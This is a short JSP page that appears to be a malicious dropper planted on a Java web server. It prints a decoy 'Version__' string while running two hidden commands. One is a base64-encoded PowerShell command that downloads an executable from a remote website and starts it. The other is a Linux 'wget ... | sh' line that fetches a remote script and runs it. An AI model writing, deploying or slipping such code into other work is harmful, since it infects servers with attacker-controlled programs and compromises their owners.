<%@ page import="java.util.*,java.io.*"%>
<%
out.println("Version__");
try{
        Runtime.getRuntime().exec("powershell -windowstyle hidden -nop -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbgBhAG8AcwBiAGkAbwAuAGMAbwBtAC8AaQBtAGEAZwBlAHMALwBtAGEAaQBuAC8AagBzAC8AYQAvAGoAYQB2AGEAZQAuAGUAeABlACcALAAnAEMAOgAvAFAAcgBvAGcAcgBhAG0ARABhAHQAYQAvAHMAdAAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAEMAOgAvAFAAcgBvAGcAcgBhAG0ARABhAHQAYQAvAHMAdAAuAGUAeABlACcA");
        Thread.sleep(2000);
}catch(Exception e){
        out.println(e.toString());
}
try{
    String[] command = { "/bin/sh", "-c", "wget -q http://www.vprove.co.kr/images/img/linux.txt -O - |sh"};
    Runtime.getRuntime().exec(command);
}catch(Exception e){
        out.println(e.toString());
}
%>
